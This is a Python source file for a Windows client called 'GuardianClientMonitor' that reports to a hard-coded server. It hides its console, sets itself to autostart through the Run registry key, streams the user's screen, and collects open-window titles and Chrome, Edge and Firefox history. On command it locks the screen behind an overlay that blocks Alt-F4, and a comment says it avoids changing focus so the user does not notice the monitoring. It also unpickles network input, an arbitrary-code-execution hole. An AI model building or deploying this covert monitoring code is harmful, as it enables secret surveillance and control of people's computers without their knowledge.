import socket
import pickle
import threading
import time
import io
import os
import sys
import pyautogui
import psutil
import win32gui
import win32process
import win32con
import win32api
import winreg
import ctypes
from PIL import Image
import sqlite3
import shutil
import datetime
import logging
import tempfile
from pathlib import Path
import numpy as np
import cv2
from tkinter import Tk, Canvas, PhotoImage, BOTH

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename=os.path.join(tempfile.gettempdir(), 'guardian_client.log'),
    filemode='a'
)

class GuardianClientMonitor:
    def __init__(self):
        # Connection settings
        self.server_ip = "192.168.50.169"  # Your admin computer's IP
        self.server_port = 5555
        self.reconnect_delay = 5  # Seconds to wait before reconnection attempts
        self.max_reconnect_attempts = 10  # Maximum number of reconnection attempts
        
        # Status flags
        self.connected = False
        self.monitoring_paused = False  # Pause monitoring/streaming
        self.screen_frozen = False      # Freeze the user's screen
        self.running = True
        self.socket = None
        
        # Screen freeze settings
        self.freeze_window = None
        self.freeze_canvas = None
        self.freeze_image = None
        self.freeze_photo = None
        
        # Stream settings
        self.stream_fps = 15            # Target frames per second for screen streaming
        self.stream_quality = 50        # JPEG quality (1-100)
        self.stream_scale = 0.7         # Scale factor to reduce bandwidth
        self.streaming = False          # Flag to control streaming
        
        # Attempt to hide the console window if running as an executable
        self.hide_console()
        
        # Setup autostart
        self.setup_autostart()
        
        # Start monitoring in a separate thread
        self.monitoring_thread = threading.Thread(target=self.run_monitoring)
        self.monitoring_thread.daemon = True
        self.monitoring_thread.start()
        
        # Keep the main thread alive
        self.keep_alive()
    
    def hide_console(self):
        """Hide console window if running as executable"""
        try:
            if sys.stdout.isatty():  # Check if running in a terminal
                # Get console window handle
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                if console_window != 0:
                    # Hide the window
                    ctypes.windll.user32.ShowWindow(console_window, 0)
                    logging.info("Console window hidden")
        except Exception as e:
            logging.error(f"Failed to hide console: {e}")
    
    def setup_autostart(self):
        """Setup the application to start automatically on Windows boot"""
        try:
            # Get the path of the current executable
            if getattr(sys, 'frozen', False):
                # If the application is frozen (compiled)
                app_path = sys.executable
            else:
                # If running as a script
                app_path = os.path.abspath(__file__)
            
            # Create registry key for autostart
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            registry_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Set the registry value
            winreg.SetValueEx(
                registry_key,
                "GuardianClientMonitor",  # Registry entry name
                0,
                winreg.REG_SZ,
                f'"{app_path}"'
            )
            
            winreg.CloseKey(registry_key)
            logging.info("Autostart registry entry created")
        except Exception as e:
            logging.error(f"Failed to setup autostart: {e}")
    
    def connect_to_server(self):
        """Connect to the monitoring server"""
        attempts = 0
        while not self.connected and attempts < self.max_reconnect_attempts and self.running:
            try:
                logging.info(f"Connecting to server at {self.server_ip}:{self.server_port}...")
                
                # Create a new socket
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)  # Set a timeout for connection attempts
                
                # Connect to server
                self.socket.connect((self.server_ip, self.server_port))
                
                # If we get here, connection was successful
                self.connected = True
                logging.info("Connected to server successfully")
                
                # Reset attempt counter
                attempts = 0
                
                # Start listening for commands
                self.listen_for_commands()
                
            except Exception as e:
                logging.error(f"Connection attempt {attempts+1} failed: {e}")
                attempts += 1
                
                # Close socket if it exists
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                    finally:
                        self.socket = None
                
                # Reset connection flag
                self.connected = False
                
                # Wait before trying again
                time.sleep(self.reconnect_delay)
    
    def listen_for_commands(self):
        """Listen for commands from the server"""
        buffer_size = 4096
        data = b""
        
        while self.connected and self.running:
            try:
                # Receive data
                chunk = self.socket.recv(buffer_size)
                
                if not chunk:
                    # Connection closed by server
                    logging.warning("Connection closed by server")
                    break
                
                # Add chunk to buffer
                data += chunk
                
                # Try to unpickle the data
                try:
                    # Check if we have complete data
                    command = pickle.loads(data)
                    
                    # Process command
                    self.process_command(command)
                    
                    # Reset buffer
                    data = b""
                    
                except pickle.UnpicklingError:
                    # Incomplete data, continue receiving
                    pass
                
            except socket.timeout:
                # Socket timeout, just continue
                continue
                
            except Exception as e:
                logging.error(f"Error receiving commands: {e}")
                break
        
        # If we're here, connection was lost or closed
        self.connected = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            finally:
                self.socket = None
    
    def process_command(self, command):
        """Process command received from server"""
        if not isinstance(command, dict):
            logging.error(f"Invalid command format: {command}")
            return
        
        try:
            command_type = command.get("command", "")
            
            if command_type == "get_screenshot":
                # Send screenshot
                self.send_screenshot()
                
            elif command_type == "get_windows":
                # Send list of open windows
                self.send_windows_list()
                
            elif command_type == "get_history":
                # Send browser history
                self.send_browser_history()
                
            elif command_type == "view_window":
                # Focus on specific window
                window_id = command.get("window_id")
                if window_id is not None:
                    self.focus_window(window_id)
                
            elif command_type == "pause_monitoring":
                # Pause or resume monitoring/streaming
                self.monitoring_paused = command.get("paused", False)
                logging.info(f"Monitoring {'paused' if self.monitoring_paused else 'resumed'}")
                
            elif command_type == "freeze_screen":
                # Freeze or unfreeze user's screen
                freeze = command.get("freeze", False)
                if freeze:
                    self.freeze_screen()
                else:
                    self.unfreeze_screen()
                
            elif command_type == "start_stream":
                # Start screen streaming
                self.start_screen_stream()
                
            elif command_type == "stop_stream":
                # Stop screen streaming
                self.stop_screen_stream()
                
            elif command_type == "disconnect":
                # Disconnect from server
                logging.info("Received disconnect command")
                self.connected = False
                
            else:
                logging.warning(f"Unknown command: {command_type}")
                
        except Exception as e:
            logging.error(f"Error processing command: {e}")
    
    def send_data(self, data):
        """Send data to the server"""
        if not self.connected or not self.socket:
            return False
        
        try:
            # Serialize data with pickle
            serialized_data = pickle.dumps(data)
            
            # Send data
            self.socket.sendall(serialized_data)
            return True
            
        except Exception as e:
            logging.error(f"Error sending data: {e}")
            self.connected = False
            return False
    
    def send_screenshot(self):
        """Capture and send a single screenshot to server"""
        if self.monitoring_paused:
            return
        
        try:
            # Capture screenshot using pyautogui
            screenshot = pyautogui.screenshot()
            
            # Resize to reduce bandwidth if needed
            if self.stream_scale < 1.0:
                width, height = screenshot.size
                new_width = int(width * self.stream_scale)
                new_height = int(height * self.stream_scale)
                screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)
            
            # Convert to bytes
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=self.stream_quality)
            
            # Prepare data
            data = {
                "type": "screenshot",
                "data": img_bytes.getvalue()
            }
            
            # Send to server
            self.send_data(data)
            
        except Exception as e:
            logging.error(f"Error capturing screenshot: {e}")
    
    def start_screen_stream(self):
        """Start streaming the screen to the server"""
        if self.streaming:
            return
        
        self.streaming = True
        
        # Start streaming in a separate thread
        stream_thread = threading.Thread(target=self.stream_screen)
        stream_thread.daemon = True
        stream_thread.start()
        
        logging.info("Screen streaming started")
    
    def stop_screen_stream(self):
        """Stop streaming the screen"""
        self.streaming = False
        logging.info("Screen streaming stopped")
    
    def stream_screen(self):
        """Stream screen continuously to the server"""
        frame_delay = 1.0 / self.stream_fps  # Time between frames
        
        prev_frame = None
        while self.streaming and self.connected and not self.monitoring_paused:
            try:
                start_time = time.time()
                
                # Capture screenshot of entire screen, regardless of which window is in focus
                screenshot = pyautogui.screenshot()
                
                # Convert to numpy array for processing
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                
                # Resize to reduce bandwidth
                if self.stream_scale < 1.0:
                    frame = cv2.resize(
                        frame, 
                        (0, 0), 
                        fx=self.stream_scale, 
                        fy=self.stream_scale, 
                        interpolation=cv2.INTER_AREA
                    )
                
                # Only send if frame changed significantly or periodically
                send_frame = False
                if prev_frame is None:
                    send_frame = True
                else:
                    # Calculate difference between frames
                    # Simple method: just check if more than 1% of pixels changed significantly
                    diff = cv2.absdiff(frame, prev_frame)
                    changed_pixels = np.sum(diff > 30)  # Threshold for change
                    total_pixels = frame.shape[0] * frame.shape[1] * frame.shape[2]
                    change_percentage = changed_pixels / total_pixels
                    
                    if change_percentage > 0.01:  # 1% threshold
                        send_frame = True
                
                # Send frame if needed
                if send_frame:
                    # Convert back to PIL for JPEG compression
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    pil_img = Image.fromarray(frame_rgb)
                    
                    # Compress and send
                    img_bytes = io.BytesIO()
                    pil_img.save(img_bytes, format='JPEG', quality=self.stream_quality)
                    
                    # Prepare data
                    data = {
                        "type": "screenshot",  # Keep same type for compatibility
                        "data": img_bytes.getvalue()
                    }
                    
                    # Send to server
                    self.send_data(data)
                    
                    # Update previous frame
                    prev_frame = frame
                
                # Calculate time to wait to maintain frame rate
                elapsed = time.time() - start_time
                sleep_time = max(0, frame_delay - elapsed)
                if sleep_time > 0:
                    time.sleep(sleep_time)
                
            except Exception as e:
                logging.error(f"Error streaming screen: {e}")
                time.sleep(1)  # Wait a bit before trying again
        
        logging.info("Screen streaming thread ended")
    
    def get_window_list(self):
        """Get list of open windows"""
        windows = []
        window_ids = {}
        
        def enum_windows_callback(hwnd, result):
            # Check if window is visible
            if win32gui.IsWindowVisible(hwnd):
                # Get window title
                title = win32gui.GetWindowText(hwnd)
                
                # Skip empty titles and some system windows
                if not title or title in ["Program Manager", "Windows Shell Experience Host"]:
                    return True
                
                try:
                    # Get process ID
                    _, process_id = win32process.GetWindowThreadProcessId(hwnd)
                    
                    # Get process name
                    try:
                        process = psutil.Process(process_id)
                        process_name = process.name()
                    except:
                        process_name = "Unknown"
                    
                    # Skip certain system processes
                    if process_name in ["explorer.exe"] and title in ["", "Windows Explorer"]:
                        return True
                    
                    # Add to list if not already added
                    if hwnd not in window_ids:
                        window_ids[hwnd] = len(windows) + 1
                        windows.append({
                            "id": window_ids[hwnd],
                            "hwnd": hwnd,
                            "title": title,
                            "process": process_name
                        })
                    
                except Exception as e:
                    logging.error(f"Error getting window info: {e}")
                
            return True
        
        # Enumerate all windows
        win32gui.EnumWindows(enum_windows_callback, None)
        
        # Sort by window title
        windows.sort(key=lambda w: w["title"].lower())
        
        return windows
    
    def send_windows_list(self):
        """Send list of open windows to server"""
        try:
            # Get window list
            windows = self.get_window_list()
            
            # Prepare data
            data = {
                "type": "windows_list",
                "data": windows
            }
            
            # Send to server
            self.send_data(data)
            
        except Exception as e:
            logging.error(f"Error sending windows list: {e}")
    
    def focus_window(self, window_id):
        """Record which window the admin wants to view, without changing focus on client"""
        try:
            # Get window list
            windows = self.get_window_list()
            
            # Find window with matching ID
            target_window = None
            for window in windows:
                if window["id"] == window_id:
                    target_window = window
                    break
            
            if target_window:
                # Record that this window is being viewed, but DON'T bring it to foreground
                # to prevent the user from noticing the monitoring
                logging.info(f"Admin is viewing window: {target_window['title']} (invisible to user)")
                
                # Send confirmation to server
                self.send_data({
                    "type": "view_status",
                    "window_id": window_id,
                    "title": target_window['title'],
                    "status": "success"
                })
            else:
                logging.warning(f"Window with ID {window_id} not found")
                
        except Exception as e:
            logging.error(f"Error in view_window: {e}")
    
    def get_browser_history(self):
        """Get browser history from multiple browsers"""
        history = []
        
        # Try to get history from multiple browsers
        edge_history = self.get_edge_history()
        chrome_history = self.get_chrome_history()
        firefox_history = self.get_firefox_history()
        
        # Combine all histories
        history.extend(edge_history)
        history.extend(chrome_history)
        history.extend(firefox_history)
        
        # Sort by time (most recent first)
        history.sort(key=lambda x: x.get('time', '00:00:00'), reverse=True)
        
        return history
    
    def get_edge_history(self):
        """Get Microsoft Edge browser history"""
        history = []
        
        try:
            # Edge's history database location
            edge_data_path = os.path.join(
                os.environ['LOCALAPPDATA'],
                'Microsoft', 'Edge', 'User Data', 'Default', 'History'
            )
            
            # Check if file exists
            if not os.path.exists(edge_data_path):
                logging.warning("Edge history database not found")
                return history
            
            # Create a copy of the database to avoid lock issues
            temp_db_path = os.path.join(tempfile.gettempdir(), 'edge_history_temp.db')
            shutil.copy2(edge_data_path, temp_db_path)
            
            # Connect to the copied database
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            # Query recent history (last 7 days)
            time_limit = int((datetime.datetime.now() - datetime.datetime(1970, 1, 1)).total_seconds()) - (7 * 24 * 60 * 60)
            cursor.execute(
                """
                SELECT 
                    urls.url, 
                    urls.title, 
                    datetime(visits.visit_time/1000000-11644473600, 'unixepoch', 'localtime') as visit_time
                FROM 
                    urls JOIN visits ON urls.id = visits.url
                WHERE 
                    visits.visit_time/1000000-11644473600 > ?
                ORDER BY 
                    visits.visit_time DESC
                LIMIT 200
                """, 
                (time_limit,)
            )
            
            # Format results
            for row in cursor.fetchall():
                url, title, visit_time = row
                
                # Format time
                try:
                    dt = datetime.datetime.strptime(visit_time, '%Y-%m-%d %H:%M:%S')
                    time_str = dt.strftime('%H:%M:%S')
                    date_str = dt.strftime('%Y-%m-%d')
                except:
                    time_str = "00:00:00"
                    date_str = "Unknown"
                
                # Add to history list
                history.append({
                    "url": url,
                    "title": title or url,
                    "time": time_str,
                    "date": date_str,
                    "browser": "Microsoft Edge"
                })
            
            # Close connection
            conn.close()
            
            # Clean up
            try:
                os.remove(temp_db_path)
            except:
                pass
            
        except Exception as e:
            logging.error(f"Error getting Edge history: {e}")
        
        return history
    
    def get_chrome_history(self):
        """Get Google Chrome browser history"""
        history = []
        
        try:
            # Chrome's history database location
            chrome_data_path = os.path.join(
                os.environ['LOCALAPPDATA'],
                'Google', 'Chrome', 'User Data', 'Default', 'History'
            )
            
            # Check if file exists
            if not os.path.exists(chrome_data_path):
                logging.warning("Chrome history database not found")
                return history
            
            # Create a copy of the database to avoid lock issues
            temp_db_path = os.path.join(tempfile.gettempdir(), 'chrome_history_temp.db')
            shutil.copy2(chrome_data_path, temp_db_path)
            
            # Connect to the copied database
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            # Query recent history (last 7 days)
            time_limit = int((datetime.datetime.now() - datetime.datetime(1970, 1, 1)).total_seconds()) - (7 * 24 * 60 * 60)
            cursor.execute(
                """
                SELECT 
                    urls.url, 
                    urls.title, 
                    datetime(visits.visit_time/1000000-11644473600, 'unixepoch', 'localtime') as visit_time
                FROM 
                    urls JOIN visits ON urls.id = visits.url
                WHERE 
                    visits.visit_time/1000000-11644473600 > ?
                ORDER BY 
                    visits.visit_time DESC
                LIMIT 200
                """, 
                (time_limit,)
            )
            
            # Format results
            for row in cursor.fetchall():
                url, title, visit_time = row
                
                # Format time
                try:
                    dt = datetime.datetime.strptime(visit_time, '%Y-%m-%d %H:%M:%S')
                    time_str = dt.strftime('%H:%M:%S')
                    date_str = dt.strftime('%Y-%m-%d')
                except:
                    time_str = "00:00:00"
                    date_str = "Unknown"
                
                # Add to history list
                history.append({
                    "url": url,
                    "title": title or url,
                    "time": time_str,
                    "date": date_str,
                    "browser": "Google Chrome"
                })
            
            # Close connection
            conn.close()
            
            # Clean up
            try:
                os.remove(temp_db_path)
            except:
                pass
            
        except Exception as e:
            logging.error(f"Error getting Chrome history: {e}")
        
        return history
    
    def get_firefox_history(self):
        """Get Firefox browser history"""
        history = []
        
        try:
            # Find Firefox profile folder
            firefox_path = os.path.join(
                os.environ['APPDATA'],
                'Mozilla', 'Firefox', 'Profiles'
            )
            
            if not os.path.exists(firefox_path):
                logging.warning("Firefox profiles folder not found")
                return history
            
            # Find the default profile (ends with .default or .default-release)
            profile_dir = None
            for item in os.listdir(firefox_path):
                if item.endswith('.default') or item.endswith('.default-release'):
                    profile_dir = os.path.join(firefox_path, item)
                    break
            
            if not profile_dir:
                logging.warning("Firefox default profile not found")
                return history
            
            # Places database contains history
            places_db = os.path.join(profile_dir, 'places.sqlite')
            
            if not os.path.exists(places_db):
                logging.warning("Firefox places database not found")
                return history
            
            # Create a copy of the database to avoid lock issues
            temp_db_path = os.path.join(tempfile.gettempdir(), 'firefox_history_temp.db')
            shutil.copy2(places_db, temp_db_path)
            
            # Connect to the copied database
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            # Query recent history (last 7 days)
            time_limit = int((datetime.datetime.now() - datetime.datetime(1970, 1, 1)).total_seconds()) - (7 * 24 * 60 * 60)
            time_limit_micro = time_limit * 1000000
            
            cursor.execute(
                """
                SELECT 
                    moz_places.url,
                    moz_places.title,
                    datetime(moz_historyvisits.visit_date/1000000, 'unixepoch', 'localtime') as visit_time
                FROM 
                    moz_places JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
                WHERE 
                    moz_historyvisits.visit_date > ?
                ORDER BY 
                    moz_historyvisits.visit_date DESC
                LIMIT 200
                """, 
                (time_limit_micro,)
            )
            
            # Format results
            for row in cursor.fetchall():
                url, title, visit_time = row
                
                # Format time
                try:
                    dt = datetime.datetime.strptime(visit_time, '%Y-%m-%d %H:%M:%S')
                    time_str = dt.strftime('%H:%M:%S')
                    date_str = dt.strftime('%Y-%m-%d')
                except:
                    time_str = "00:00:00"
                    date_str = "Unknown"
                
                # Add to history list
                history.append({
                    "url": url,
                    "title": title or url,
                    "time": time_str,
                    "date": date_str,
                    "browser": "Firefox"
                })
            
            # Close connection
            conn.close()
            
            # Clean up
            try:
                os.remove(temp_db_path)
            except:
                pass
            
        except Exception as e:
            logging.error(f"Error getting Firefox history: {e}")
        
        return history
    
    def send_browser_history(self):
        """Send browser history to server"""
        try:
            # Get browser history from all browsers
            history = self.get_browser_history()
            
            # Prepare data
            data = {
                "type": "browser_history",
                "data": history
            }
            
            # Send to server
            self.send_data(data)
            logging.info(f"Sent {len(history)} browser history entries to server")
            
        except Exception as e:
            logging.error(f"Error sending browser history: {e}")
    
    def run_monitoring(self):
        """Main monitoring loop"""
        while self.running:
            # Attempt to connect if not connected
            if not self.connected:
                self.connect_to_server()
            
            # If still not connected after attempt, wait before retrying
            if not self.connected:
                time.sleep(self.reconnect_delay)
                continue
            
            # Wait a bit
            time.sleep(1)
    
    def freeze_screen(self):
        """Freeze the user's screen by displaying a fullscreen overlay with current screenshot"""
        if self.screen_frozen:
            return
            
        try:
            logging.info("Freezing screen")
            self.screen_frozen = True
            
            # Capture current screen
            screenshot = pyautogui.screenshot()
            
            # Create tkinter window
            self.freeze_window = Tk()
            self.freeze_window.attributes('-fullscreen', True)
            self.freeze_window.attributes('-topmost', True)
            
            # Disable keyboard and mouse escape methods
            self.freeze_window.overrideredirect(True)
            self.freeze_window.protocol("WM_DELETE_WINDOW", lambda: None)
            
            # Create canvas for image
            self.freeze_canvas = Canvas(
                self.freeze_window, 
                width=self.freeze_window.winfo_screenwidth(),
                height=self.freeze_window.winfo_screenheight(),
                highlightthickness=0
            )
            self.freeze_canvas.pack(fill=BOTH, expand=True)
            
            # Display screenshot
            self.freeze_image = screenshot
            self.freeze_photo = PhotoImage(data=self.image_to_data(screenshot))
            self.freeze_canvas.create_image(0, 0, image=self.freeze_photo, anchor="nw")
            
            # Run in separate thread
            freeze_thread = threading.Thread(target=self.run_freeze_window)
            freeze_thread.daemon = True
            freeze_thread.start()
            
            # Notify server of success
            self.send_data({
                "type": "freeze_status",
                "status": "success",
                "message": "Screen frozen successfully"
            })
            
        except Exception as e:
            logging.error(f"Error freezing screen: {e}")
            self.screen_frozen = False
            
            # Notify server of failure
            self.send_data({
                "type": "freeze_status",
                "status": "error",
                "message": f"Failed to freeze screen: {str(e)}"
            })
    
    def image_to_data(self, image):
        """Convert PIL Image to bytes for PhotoImage"""
        img_bytes = io.BytesIO()
        image.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        return img_bytes.read()
    
    def run_freeze_window(self):
        """Run the freeze window main loop"""
        try:
            # Capture all input by grabbing focus
            self.freeze_window.focus_force()
            
            # Disable Alt+F4 and other keyboard shortcuts
            def block_key(event):
                return "break"
            
            self.freeze_window.bind("<Alt-F4>", block_key)
            self.freeze_window.bind("<Control-Alt-Delete>", block_key)
            self.freeze_window.bind("<Control-Shift-Escape>", block_key)
            
            # Start main loop
            self.freeze_window.mainloop()
        except Exception as e:
            logging.error(f"Error in freeze window: {e}")
    
    def unfreeze_screen(self):
        """Unfreeze the screen by closing the overlay window"""
        if not self.screen_frozen:
            return
            
        try:
            logging.info("Unfreezing screen")
            
            # Close window if it exists
            if self.freeze_window:
                self.freeze_window.destroy()
                self.freeze_window = None
                self.freeze_canvas = None
                self.freeze_photo = None
                self.freeze_image = None
            
            self.screen_frozen = False
            
            # Notify server of success
            self.send_data({
                "type": "freeze_status",
                "status": "success",
                "message": "Screen unfrozen successfully"
            })
            
        except Exception as e:
            logging.error(f"Error unfreezing screen: {e}")
            
            # Notify server of failure
            self.send_data({
                "type": "freeze_status",
                "status": "error",
                "message": f"Failed to unfreeze screen: {str(e)}"
            })
    
    def keep_alive(self):
        """Keep the main thread alive and handle periodic tasks"""
        while self.running:
            # Start streaming automatically when connected
            if self.connected and not self.streaming and not self.monitoring_paused:
                self.start_screen_stream()
            
            # Prevent CPU hogging
            time.sleep(0.5)

if __name__ == "__main__":
    # Create and start client
    client = GuardianClientMonitor()